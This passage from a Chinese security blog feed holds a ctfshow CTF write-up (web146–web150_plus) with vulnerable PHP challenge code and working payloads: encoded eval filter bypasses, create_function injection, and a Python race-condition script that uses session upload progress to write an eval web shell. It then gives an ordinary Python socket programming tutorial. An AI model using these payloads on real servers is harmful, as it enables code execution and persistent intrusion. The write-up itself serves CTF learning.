&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);
if(isset($_GET[&#39;v1&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v2&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v3&#39;]))&amp;#123;
    $v1 = (String)$_GET[&#39;v1&#39;];
    $v2 = (String)$_GET[&#39;v2&#39;];
    $v3 = (String)$_GET[&#39;v3&#39;];
    if(is_numeric($v1) &amp;amp;&amp;amp; is_numeric($v2))&amp;#123;
        if(preg_match(&#39;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&amp;#125;|\%|\&amp;amp;|\;|\&amp;lt;|\&amp;gt;|\*|\/|\^|\#|\&amp;quot;/i&#39;, $v3))&amp;#123;
                die(&#39;get out hacker!&#39;);
        &amp;#125;
        else&amp;#123;
            $code =  eval(&amp;quot;return $v1$v3$v2;&amp;quot;);
            echo &amp;quot;$v1$v3$v2 = &amp;quot;.$code;
        &amp;#125;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;开始我还在疑惑为啥题没改，才看到那些运算符都加入黑名单了，这里还能用的有 | 和三元运算符&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?v1=1&amp;amp;v2=2&amp;amp;v3=|(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F)|

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220182206212.png&#34; alt=&#34;image-20230220182206212&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web147&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web147&#34;&gt;#&lt;/a&gt; web147&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);

if(isset($_POST[&#39;ctf&#39;]))&amp;#123;
    $ctfshow = $_POST[&#39;ctf&#39;];
    if(!preg_match(&#39;/^[a-z0-9_]*$/isD&#39;,$ctfshow)) &amp;#123;
        $ctfshow(&#39;&#39;,$_GET[&#39;show&#39;]);
    &amp;#125;

&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;create_function 的代码注入，先看看官方文档怎么说&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220182826525.png&#34; alt=&#34;image-20230220182826525&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里就正常使用 create_function 的代码注入，但是麻烦的是这个正则，这里使用 \ 可以绕过，php 里默认命名空间是 \，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名 function_name () 调用，调用的时候其实相当于写了一个相对路 径； 而如果写 \function_name () 这样调用函数，则其实是写了一个绝对路径。 如果你在其他 namespace 里调用系统类，就必须写绝对路径这种写法&lt;/p&gt;
&lt;p&gt;那么剩下的就简单了，正常注入就行，} 闭合原来的函数，然后执行命令，然后再把多余的} 给注释掉就可以了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220185007527.png&#34; alt=&#34;image-20230220185007527&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220184918100.png&#34; alt=&#34;image-20230220184918100&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web148&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web148&#34;&gt;#&lt;/a&gt; web148&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
include &#39;flag.php&#39;;
if(isset($_GET[&#39;code&#39;]))&amp;#123;
    $code=$_GET[&#39;code&#39;];
    if(preg_match(&amp;quot;/[A-Za-z0-9_\%\\|\~\&#39;\,\.\:\@\&amp;amp;\*\+\- ]+/&amp;quot;,$code))&amp;#123;
        die(&amp;quot;error&amp;quot;);
    &amp;#125;
    @eval($code);
&amp;#125;
else&amp;#123;
    highlight_file(__FILE__);
&amp;#125;

function get_ctfshow_fl0g()&amp;#123;
    echo file_get_contents(&amp;quot;flag.php&amp;quot;);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里看来只能使用异或了&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?code=(&amp;quot;%0c%19%0c%5c%60%60&amp;quot;^&amp;quot;%7f%60%7f%28%05%0d&amp;quot;)(&amp;quot;%09%01%03%01%06%02&amp;quot;^&amp;quot;%7d%60%60%21%60%28&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220190521659.png&#34; alt=&#34;image-20230220190521659&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web149&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web149&#34;&gt;#&lt;/a&gt; web149&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);

$files = scandir(&#39;./&#39;); 
foreach($files as $file) &amp;#123;
    if(is_file($file))&amp;#123;
        if ($file !== &amp;quot;index.php&amp;quot;) &amp;#123;
            unlink($file);
        &amp;#125;
    &amp;#125;
&amp;#125;

file_put_contents($_GET[&#39;ctf&#39;], $_POST[&#39;show&#39;]);

$files = scandir(&#39;./&#39;); 
foreach($files as $file) &amp;#123;
    if(is_file($file))&amp;#123;
        if ($file !== &amp;quot;index.php&amp;quot;) &amp;#123;
            unlink($file);
        &amp;#125;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;很简单的条件竞争没啥好说的&lt;/p&gt;
&lt;h2 id=&#34;web150&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web150&#34;&gt;#&lt;/a&gt; web150&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
include(&amp;quot;flag.php&amp;quot;);
error_reporting(0);
highlight_file(__FILE__);

class CTFSHOW&amp;#123;
    private $username;
    private $password;
    private $vip;
    private $secret;

    function __construct()&amp;#123;
        $this-&amp;gt;vip = 0;
        $this-&amp;gt;secret = $flag;
    &amp;#125;

    function __destruct()&amp;#123;
        echo $this-&amp;gt;secret;
    &amp;#125;

    public function isVIP()&amp;#123;
        return $this-&amp;gt;vip?TRUE:FALSE;
        &amp;#125;
    &amp;#125;

    function __autoload($class)&amp;#123;
        if(isset($class))&amp;#123;
            $class();
    &amp;#125;
&amp;#125;

#过滤字符
$key = $_SERVER[&#39;QUERY_STRING&#39;];
if(preg_match(&#39;/\_| |\[|\]|\?/&#39;, $key))&amp;#123;
    die(&amp;quot;error&amp;quot;);
&amp;#125;
$ctf = $_POST[&#39;ctf&#39;];
extract($_GET);
if(class_exists($__CTFSHOW__))&amp;#123;
    echo &amp;quot;class is exists!&amp;quot;;
&amp;#125;

if($isVIP &amp;amp;&amp;amp; strrpos($ctf, &amp;quot;:&amp;quot;)===FALSE)&amp;#123;
    include($ctf);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里的 include 文件包含没啥限制，任意文件包含，看到往上的师傅说可以日志包含，果然强但是我没能成功复现，包含 session 文件还是可以的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220202411298.png&#34; alt=&#34;image-20230220202411298&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web150_plus&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web150_plus&#34;&gt;#&lt;/a&gt; web150_plus&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
include(&amp;quot;flag.php&amp;quot;);
error_reporting(0);
highlight_file(__FILE__);

class CTFSHOW&amp;#123;
    private $username;
    private $password;
    private $vip;
    private $secret;

    function __construct()&amp;#123;
        $this-&amp;gt;vip = 0;
        $this-&amp;gt;secret = $flag;
    &amp;#125;

    function __destruct()&amp;#123;
        echo $this-&amp;gt;secret;
    &amp;#125;

    public function isVIP()&amp;#123;
        return $this-&amp;gt;vip?TRUE:FALSE;
        &amp;#125;
    &amp;#125;

    function __autoload($class)&amp;#123;
        if(isset($class))&amp;#123;
            $class();
    &amp;#125;
&amp;#125;

#过滤字符
$key = $_SERVER[&#39;QUERY_STRING&#39;];
if(preg_match(&#39;/\_| |\[|\]|\?/&#39;, $key))&amp;#123;
    die(&amp;quot;error&amp;quot;);
&amp;#125;
$ctf = $_POST[&#39;ctf&#39;];
extract($_GET);
if(class_exists($__CTFSHOW__))&amp;#123;
    echo &amp;quot;class is exists!&amp;quot;;
&amp;#125;

if($isVIP &amp;amp;&amp;amp; strrpos($ctf, &amp;quot;:&amp;quot;)===FALSE &amp;amp;&amp;amp; strrpos($ctf,&amp;quot;log&amp;quot;)===FALSE)&amp;#123;
    include($ctf);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里多加了一个 log，但是好像没啥太大影响&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;这个题一点点小坑__autoload()函数不是类里面的
__autoload — 尝试加载未定义的类
最后构造?..CTFSHOW..=phpinfo就可以看到phpinfo信息啦
原因是..CTFSHOW..解析变量成__CTFSHOW__然后进行了变量覆盖，因为CTFSHOW是类就会使用
__autoload()函数方法，去加载，因为等于phpinfo就会去加载phpinfo
接下来就去getshell啦
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最后整个脚本&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
import io
import requests
import threading
url = &#39;http://3b26945b-f942-4c30-8a18-9c796b82a7cc.challenge.ctf.show/?isVIP=1&#39;


event = threading.Event()


def write(session):
    data = &amp;#123;
        &#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;aaaaaa&amp;lt;?php file_put_contents(&amp;quot;/var/www/html/s.php&amp;quot;, base64_decode(&amp;quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&amp;quot;));?&amp;gt;&#39;
    &amp;#125;
    while True:
        if event.is_set():
            return
        f = io.BytesIO(b&#39;a&#39; * 1024 * 10)
        _ = session.post(url,cookies=&amp;#123;&#39;PHPSESSID&#39;: &#39;down&#39;&amp;#125;, data=data, files=&amp;#123;&#39;file&#39;: (&#39;verysafe.txt&#39;, f)&amp;#125;)


def read(session):
    while True:
        if event.is_set():
            return
        response = session.post(url, data=&amp;#123;&amp;quot;ctf&amp;quot;: &amp;quot;/tmp/sess_down&amp;quot;&amp;#125;)
        if &#39;aaaaaa&#39; in response.text:
            print(response.text)
            event.set()
        else:
            print(&#39;retry&#39;)


if __name__ == &#39;__main__&#39;:
    session = requests.session()
    for i in range(30):
        threading.Thread(target=write, args=(session,)).start()
    for i in range(30):
        threading.Thread(target=read, args=(session,)).start()
    event.wait()
&lt;/code&gt;&lt;/pre&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://blog.xcu.icu/2023/02/01/Python%E7%BD%91%E7%BB%9C%E5%8C%96%E7%BC%96%E7%A8%8B/</guid>
            <title>Python网络化编程</title>
            <link>https://blog.xcu.icu/2023/02/01/Python%E7%BD%91%E7%BB%9C%E5%8C%96%E7%BC%96%E7%A8%8B/</link>
            <category term="Python" scheme="https://blog.xcu.icu/categories/Python/" />
            <category term="Python" scheme="https://blog.xcu.icu/tags/Python/" />
            <pubDate>Wed, 01 Feb 2023 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;网络架构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络架构&#34;&gt;#&lt;/a&gt; 网络架构&lt;/h2&gt;
&lt;h3 id=&#34;网络体系结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络体系结构&#34;&gt;#&lt;/a&gt; 网络体系结构&lt;/h3&gt;
&lt;p&gt;1.OSI 协议是由 ISO (国际标准化组织) 制定的，用于提供给开发者一个必须的、通用的概念以便开发完善、可以用来解释连接不同系统的框架。OSI 协议将网络体系结构划分为 7 层：应用层、表示层、会话层、传输层、网络层、数据链路层、物理层。&lt;br /&gt;
2.TCP/IP (Transmission Control Protocol/Internet Protocol，传输控制协议 / 网际协议) 体系结构是指能够在多个不同网络间实现的协议簇。TCP/IP 传输协议包含 4 层体系结构，应用层、传输层、网络层和网络接口层。&lt;/p&gt;
&lt;p&gt;主要分层级如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131173017627.png&#34; alt=&#34;image-20230131173017627&#34; /&gt;&lt;/p&gt;
&lt;p&gt;分成设计的好处：&lt;/p&gt;
&lt;p&gt;各层之间可以独立设计和实现，只要保证相邻层之间的调用规范和接口不变，便可以非常方便的灵活的改变各层内部实现方式，以进行优化和完成需求&lt;/p&gt;
&lt;h3 id=&#34;应用层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#应用层&#34;&gt;#&lt;/a&gt; 应用层&lt;/h3&gt;
&lt;p&gt;应用层定义了运行在不同系统上的应用程序如何相互传递报文&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DNS: 域名系统 (Domain Name System)，用来实现域名与 IP 地址的转换，运行在 UDP 之上，默认使用 53 端口:&lt;/li&gt;
&lt;li&gt;FTP: 文件传输协议 (File Transfer Protocol)，可以通过网络在不同平台之间实现文件的传输，是一种基于 TCP 的明文传输协议，默认工作在 21 端口；&lt;/li&gt;
&lt;li&gt;HTTP: 超文本传输协议 (HyperText Transfer Protocol)，运行于 TCP 之上，默认端口为 80:&lt;/li&gt;
&lt;li&gt;SMTP: 简单邮件传输协议 (Simple Mail Transfer Protoco)，建立在 TCP 的基础上，使用明文传递邮件和发送命令，默认使用 25 端口。&lt;/li&gt;
&lt;li&gt;TELNET: 远程登陆协议，运行于 TCP 之上，默认使用 23 端口。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;传输层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#传输层&#34;&gt;#&lt;/a&gt; 传输层&lt;/h3&gt;
&lt;p&gt;主要负责向两个主机中进程之间的通信提供服务。&lt;/p&gt;
&lt;p&gt;在网络中，每台主机系统都拥有一个唯一的 IP 地址，发送方根据接收方的 IP 地址，将消息发送到接收方。每个程序的运行在主机系统中都有唯一的端口号。只需要通过 IP 进行寻址确定的目标主机，再根据目标系统的端口号，就能够正确的将消息进行传递。&lt;/p&gt;
&lt;p&gt;网络层是根据网络地址将源结点发出的数据包传送到目的结点，而传输层则负责将数据可靠地传送到目标系统对应的端口。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;TCP: 为两台计算机之间提供面向连接、可靠的字节流服务。一台计算机发出的字节流无差错地发往网络上的其他计算机，由于其可靠的传输方式，故传输速度较慢。&lt;/li&gt;
&lt;li&gt;UDP: 是一个简单的面向数据报的传输层协议。提供的是非面向连接的、不可靠的数据流传输。UDP 在传输数据报前不用在客户和服务器之间建立一个连接，且没有超时重发等机制，故传输速度很快。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;三次握手协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三次握手协议&#34;&gt;#&lt;/a&gt; 三次握手协议&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131212555640.png&#34; alt=&#34;image-20230131212555640&#34; /&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;客户端送一个 SYN 包作为建立连接的请求等待确认应答。&lt;/li&gt;
&lt;li&gt;服务器接收到请求数据包后，发送 ACK 确认应答，发送 SYN 包请求连接。&lt;/li&gt;
&lt;li&gt;客户端针对 SYN 包发送 ACK 包确认应答。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;网络层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络层&#34;&gt;#&lt;/a&gt; 网络层&lt;/h3&gt;
&lt;p&gt;ip 运行与互联网，是网络互联的重要基础，通过 ip 地址来标识网络上的主机，在公开网络上或者局域网内部，必须使用不同的 ip 地址&lt;/p&gt;
&lt;p&gt;由于网络地址转换（NAT）和代理服务器等技术的广泛应用，不同内网之间的主机可以使用相同的公网 ip 地址。IP 地址与端口来共同标识网络上特定应用程序，俗称 Socket&lt;/p&gt;
&lt;h3 id=&#34;网络接口层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络接口层&#34;&gt;#&lt;/a&gt; 网络接口层&lt;/h3&gt;
&lt;p&gt;MAC 地址也称为网卡物理地址，具有唯一性，是一个 48 为的 2 进制&lt;/p&gt;
&lt;h2 id=&#34;socket使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#socket使用&#34;&gt;#&lt;/a&gt; Socket 使用&lt;/h2&gt;
&lt;h3 id=&#34;socket的编程简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#socket的编程简介&#34;&gt;#&lt;/a&gt; Socket 的编程简介&lt;/h3&gt;
&lt;p&gt;套接字 (Socket) 是计算机之间进行通信的一种约定。通过 Socket，一台计算机可以接收其他计算机的数据，也可以向其他计算机发送数据&lt;/p&gt;
&lt;p&gt;市面上多数的远程管理软件，大多数依赖 Socket 来实现特定功能的，其包括两个部分：运行在客户端的称为 ClientSocket，运行在服务端的称为 ServerSocket，其实现通信的过程如下所示：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;服务端先初始化 Socket，然后与端口绑定（bind），对端口进行监听（listen），等待客户端连接。&lt;/li&gt;
&lt;li&gt;客户端初始化一个 Socket，客户端的套接字必须首先指出服务端套接字的地址和端口号，然后向服务器端套接字提出连接请求（connect）。&lt;/li&gt;
&lt;li&gt;当服务器端套接字接受到客户端套接字的连接请求，响应客户端套戒字的请求，建立一个新的线程，把服务器端套接字的描述发给客户端，一旦客户端确认了此描述，由此连接成功&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131215351633.png&#34; alt=&#34;image-20230131215351633&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;udp编程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#udp编程&#34;&gt;#&lt;/a&gt; UDP 编程&lt;/h3&gt;
&lt;p&gt;UDP 属于无连接协议，编程的时候不需要建立连接，而是直接向接收方发送信息。UDP 不提供应答重传机制，无法保证数据一定能够到达目的地，下面是三种 UDP 编程常用的 socket 模块方法&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;socket (family [,type [,proto]])：创建一个 Socket 对象，family 为 socket.AF_INET 表示使用 IPV4，socket.AF_INET6 表示使用 IPV6；type 为 SOCK_STREAM 表示使用 TCP，SOCK_DGRAM 表示使用 UDP&lt;/li&gt;
&lt;li&gt;sendto (string,address)：把 string 指定的内容发送给 adress 指定的地址（这里的 adress 是指 ip + 端口号）&lt;/li&gt;
&lt;li&gt;recvfrom (bufsize [,flags])：接受数据&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#server
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)#调用socket函数初始化
#print(s)
s.bind((&amp;quot;&amp;quot;,8001)) #指定IP和端口
while True:
    data,addr=s.recvfrom(1024)#不断的接收数据
    print(data.decode())
    if data.decode==&#39;exit&#39;:
        break
s.close()
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#client
import socket
import uuid
import sys

s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

def get_mac_adress():
    mac=uuid.UUID(int=uuid.getnode()).hex[-12:]
    return &amp;quot;:&amp;quot;.join([mac[e:e+2] for e in range(0,11,2)])

ip=socket.gethostbyname(socket.gethostname())
#print(&amp;quot;ip的值：&amp;quot;,ip)
mac=get_mac_adress()
#print(&amp;quot;mac的值&amp;quot;,mac)
info=&amp;quot;ip addr:&amp;quot;+ip+&amp;quot;\n&amp;quot;+&amp;quot;mac addr:&amp;quot;+mac
#print(info)
s.sendto(info.encode(),(&amp;quot;127.0.0.1&amp;quot;,8001))
s.sendto(sys.argv[1].encode(),(&amp;quot;127.0.0.1&amp;quot;,8001))
s.close()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230201195704235.png&#34; alt=&#34;image-20230201195704235&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;tcp编程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tcp编程&#34;&gt;#&lt;/a&gt; TCP 编程&lt;/h3&gt;
&lt;p&gt;通常用于可靠的数据传输场合，TCP 通常使用的 socket 模块如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;socket (family [,type [,proto]]): 创建一个 Socket 对象，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1maWFtaWx5c29ja2V0LW9vMXUuQUY=&#34;&gt;fiamily 为 socket.AF&lt;/span&gt; INET 表示使用 IPV4，socket.AF_INET6 表示使用 IPV6; type 为 SOCK STREAM 表示使用 TCP，SOCK DGRAM 表示使用 UDP。&lt;/li&gt;
&lt;li&gt;connect (address): 连接远程主机:&lt;/li&gt;
&lt;li&gt;send (bytes [,flags]): 发送数据:&lt;/li&gt;
&lt;li&gt;recv (bufsizelflags]): 接收数据:&lt;/li&gt;
&lt;li&gt;bind (address): 绑定地址:&lt;/li&gt;
&lt;li&gt;listen (backlog): 开始监听，等待客户端连接，blacklog 排队数，backlog+1 表示允许的最大连接数:&lt;/li&gt;
&lt;li&gt;accept (): 响应客户端的请求，接收一个连接&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#Server
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((&amp;quot;&amp;quot;,8001))
s.listen(1)
print(&amp;quot;Listen at port: 8001&amp;quot;)

conn,addr = s.accept()
print(conn)
print(addr)

while True:
    data = conn.recv(1024)
    data = data.decode()
    print(&#39;Recv: &#39;,data)
    c = input (&#39;Input:&#39;)
    conn.sendall(c.encode())
    if c.lower()==&#39;bye&#39;:
        break

conn.close()
s.close()
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#Client
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
    s.connect((&#39;127.0.0.1&#39;,8001))
except Exception as q:
    print(&amp;quot;Error!!!&amp;quot;)

while True:
    c = input(&amp;quot;input: &amp;quot;)
    s.sendall(c.encode())
    data = s.recv(1024).decode()
    print(&#39;Recv:&#39;,data)
    if c.lower() == &#39;bye&#39;:
        break

s.close()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230201202218353.png&#34; alt=&#34;image-20230201202218353&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230201202227841.png&#34; alt=&#34;image-20230201202227841&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;扩展&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#扩展&#34;&gt;#&lt;/a&gt; 扩展&lt;/h3&gt;
&lt;p&gt;下表还列举了一些常用函数&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;函数&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;服务器端套接字&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;s.bind()&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;绑定地址（host,port）到套接字， 在 AF_INET 下，以元组（host,port）的形式表示地址。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;s.listen()&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;开始 TCP 监听。backlog 指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为 1，大部分应用程序设为 5 就可以了。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;s.accept()&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;被动接受 TCP 客户端连接，(阻塞式) 等待连接的到来&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;客户端套接字&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;s.connect()&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;主动初始化 TCP 服务器连接，。一般 address 的格式为元组（hostname,port），如果连接出错，返回 socket.error 错误。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;s.connect_ex()&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;connect () 函数的扩展版本，出错时返回出错码，而不是抛出异常&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;公共用途的套接字函数&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;s.recv()&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;接收 TCP 数据，数据以字符串形式返回，bufsize 指定要接收的最大数据量。flag 提供有关消息的其他信息，通常可以忽略。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;s.send()&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;发送 TCP 数据，将 string 中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于 string 的字节大小。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;s.sendall()&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;完整发送 TCP 数据。将 string 中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回 None，失败则抛出异常。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;s.recvfrom()&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;接收 UDP 数据，与 recv () 类似，但返回值是（data,address）。其中 data 是包含接收数据的字符串，address 是发送数据的套接字地址。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;s.sendto()&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;发送 UDP 数据，将数据发送到套接字，address 是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;s.close()&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;关闭套接字&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;s.getpeername()&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;返回连接套接字的远程地址。返回值通常是元组（ipaddr,port）。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;s.getsockname()&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;返回套接字自己的地址。通常是一个元组 (ipaddr,port)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;s.setsockopt(level,optname,value)&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;设置给定套接字选项的值。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;s.getsockopt(level,optname[.buflen])&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;返回套接字选项的值。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;s.settimeout(timeout)&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;设置套接字操作的超时期，timeout 是一个浮点数，单位是秒。值为 None 表示没有超时期。一般，超时期应该在刚创建套接字时设置，因为它们可能用于连接的操作（如 connect ()）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;s.gettimeout()&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;返回当前超时期的值，单位是秒，如果没有设置超时期，则返回 None。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;s.fileno()&lt;/td&gt;
